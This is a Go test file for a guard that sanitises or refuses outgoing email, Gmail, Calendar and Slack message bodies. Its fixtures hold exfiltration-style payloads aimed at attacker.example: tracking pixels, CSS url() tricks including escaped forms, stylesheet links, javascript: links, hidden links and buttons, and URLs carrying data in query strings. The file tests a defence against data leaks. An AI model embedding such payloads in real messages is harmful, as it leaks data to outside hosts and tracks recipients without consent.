package webfront

import (
	"encoding/base64"
	"strings"
	"testing"
)

func TestPackBodyGuard(t *testing.T) {
	body := func(raw string) *jsObj {
		v, err := jsParse([]byte(raw))
		if err != nil {
			t.Fatal(err)
		}
		return v.(*jsObj)
	}
	out, err := guardPackBody("shop.notify", body(`{"channel":"ops","text":"Order 12 shipped"}`))
	if err != nil || strings.Contains(jsStringify(out, false), "unfurl") {
		t.Fatalf("a body that is not Slack got Slack fields: %s %v", jsStringify(out, false), err)
	}

	mailIn := `<h2 style="color:red">Low stock</h2><img src="https://attacker.example/p.gif?d=4.2M"><p>See <a href="https://attacker.example/r?d=1" onclick="x()">the report</a>` +
		` and <a href="https://dash.acme.example/r">dash.acme.example</a>.</p><style>body{background:url(https://attacker.example/c.png)}</style>` +
		`<table background="https://attacker.example/t.png"><tr><td colspan="2" style="background:url(https://attacker.example/x)">4</td></tr></table>` +
		`<link rel="stylesheet" href="https://attacker.example/s.css"><a href="javascript:alert(1)">run</a>`
	out, err = guardPackBody("resend.email", body(`{"to":["a@acme.com"],"subject":"s","html":`+jsStringify(mailIn, false)+`}`))
	if err != nil {
		t.Fatal(err)
	}
	got := jsGet(out, "html").(string)
	want := `<h2>Low stock</h2><p>See <a href="https://attacker.example/r?d=1">the report</a> (attacker.example) and <a href="https://dash.acme.example/r">dash.acme.example</a>.</p>` +
		`<table><tbody><tr><td colspan="2">4</td></tr></tbody></table>run`
	if got != want {
		t.Fatalf("safe HTML\n got %s\nwant %s", got, want)
	}
	if why := htmlProblem(got); why != "" {
		t.Fatalf("the safe HTML still fails the check: %s", why)
	}
	if _, err := guardPackBody("resend.email", body(`{"to":["a@acme.com"],"subject":"s","text":"x","attachments":[{"path":"https://attacker.example/a.pdf"}]}`)); err == nil ||
		!strings.Contains(err.Error(), "attachments") {
		t.Fatalf("attachments: %v", err)
	}

	raw := func(parts string) string {
		return base64.RawURLEncoding.EncodeToString([]byte("To: a@acme.com\r\nSubject: s\r\nMIME-Version: 1.0\r\n" + parts))
	}
	safe := raw("Content-Type: multipart/alternative; boundary=b\r\n\r\n--b\r\nContent-Type: text/plain\r\n\r\nhi\r\n--b\r\n" +
		"Content-Type: text/html\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\n<p>See <a href=3D\"https://dash.acme.example\">dash.acme.example</a></p>\r\n--b--\r\n")
	if _, err := guardPackBody("google_workspace.gmail", body(`{"raw":"`+safe+`"}`)); err != nil {
		t.Fatalf("a safe raw message: %v", err)
	}
	for name, msg := range map[string]string{
		"pixel":      "Content-Type: text/html\r\n\r\n<p>hi</p><img src=\"https://attacker.example/p.gif\">",
		"hidden":     "Content-Type: text/html\r\nContent-Transfer-Encoding: base64\r\n\r\n" + base64.StdEncoding.EncodeToString([]byte(`<a href="https://attacker.example/">invoice</a>`)),
		"attachment": "Content-Type: multipart/mixed; boundary=b\r\n\r\n--b\r\nContent-Type: text/plain\r\n\r\nhi\r\n--b\r\nContent-Type: application/pdf\r\n\r\n%PDF\r\n--b--\r\n",
	} {
		if _, err := guardPackBody("google_workspace.gmail", body(`{"message":{"raw":"`+raw(msg)+`"}}`)); err == nil {
			t.Errorf("%s: a raw message was not refused", name)
		}
	}
	if _, err := guardPackBody("google_workspace.calendar", body(`{"description":"<p>Agenda</p><img src=\"https://attacker.example/p.gif\">"}`)); err == nil {
		t.Error("HTML that loads a URL in another pack's body was not refused")
	}
}

func TestPackBodyGuardFindsEveryFetch(t *testing.T) {
	body := func(raw string) *jsObj {
		v, err := jsParse([]byte(raw))
		if err != nil {
			t.Fatal(err)
		}
		return v.(*jsObj)
	}
	gmail := func(html string) *jsObj {
		msg := "To: a@acme.com\r\nSubject: s\r\nMIME-Version: 1.0\r\nContent-Type: text/html\r\n\r\n" + html
		return body(`{"message":{"raw":"` + base64.RawURLEncoding.EncodeToString([]byte(msg)) + `"}}`)
	}
	for name, h := range map[string]string{
		"body background": `<html><body background="https://attacker.example/b.png"><p>hi</p></body></html>`,
		"html style":      `<html style="background:url(https://attacker.example/h.png)"><p>hi</p></html>`,
		"image-set":       `<p style="background-image:image-set('https://attacker.example/i.png' 1x)">hi</p>`,
		"webkit set":      `<p style="background:-webkit-image-set(url(https://attacker.example/i.png) 1x)">hi</p>`,
		"css escape":      `<p style="background:\75 rl(https://attacker.example/e.png)">hi</p>`,
		"css escape long": `<p style="background:\000075\000072l(https://attacker.example/e.png)">hi</p>`,
		"style element":   `<style>p{background:\75 rl(https://attacker.example/s.png)}</style><p>hi</p>`,
		"head link":       `<html><head><link rel="stylesheet" href="https://attacker.example/s.css"></head><body>hi</body></html>`,
		"font face":       `<style>@font-face{font-family:x;src:local(x)}</style><p>hi</p>`,
	} {
		if _, err := guardPackBody("google_workspace.gmail", gmail(h)); err == nil {
			t.Errorf("%s: a raw message that loads a URL was not refused", name)
		}
	}
	if _, err := guardPackBody("google_workspace.gmail", gmail(`<html><body><p style="color:#b00;font-weight:bold">Stock low</p></body></html>`)); err != nil {
		t.Errorf("a safe styled message was refused: %v", err)
	}

	slack := func(blocks string) *jsObj {
		return body(`{"channel":"C0123ABCD","text":"Stock low","blocks":` + blocks + `}`)
	}
	for name, blocks := range map[string]string{
		"video": `[{"type":"video","title":{"type":"plain_text","text":"Demo"},"alt_text":"demo",` +
			`"thumbnail_url":"https://attacker.example/t.png","video_url":"https://attacker.example/v"}]`,
		"slack file":    `[{"type":"section","text":{"type":"mrkdwn","text":"x"},"accessory":{"type":"other","slack_file":{"url":"https://attacker.example/f"}}}]`,
		"hidden button": `[{"type":"actions","elements":[{"type":"button","text":{"type":"plain_text","text":"Open report"},"url":"https://attacker.example/r"}]}]`,
		"hidden link": `[{"type":"rich_text","elements":[{"type":"rich_text_section","elements":[` +
			`{"type":"link","url":"https://attacker.example/r","text":"the report"}]}]}]`,
		"bare url": `[{"type":"context","elements":[{"type":"mrkdwn","text":"https://attacker.example/c?d=1"}]}]`,
	} {
		if _, err := guardPackBody("slack.message", slack(blocks)); err == nil {
			t.Errorf("%s: a Slack message with a URL in its blocks was not refused", name)
		}
	}
	if _, err := guardPackBody("slack.message", body(`{"channel":"C0123ABCD","text":"x","attachments":[{"title":"Report","title_link":"https://attacker.example/r"}]}`)); err == nil {
		t.Error("an attachment title_link was not refused")
	}
	shown := `[{"type":"section","text":{"type":"mrkdwn","text":"Germany revenue is down 62%."}},` +
		`{"type":"actions","elements":[{"type":"button","text":{"type":"plain_text","text":"Open dash.acme.example"},"url":"https://dash.acme.example/r"}]},` +
		`{"type":"rich_text","elements":[{"type":"rich_text_section","elements":[{"type":"link","url":"https://dash.acme.example/q"}]}]}]`
	if _, err := guardPackBody("slack.message", slack(shown)); err != nil {
		t.Errorf("links that show their host were refused: %v", err)
	}
}
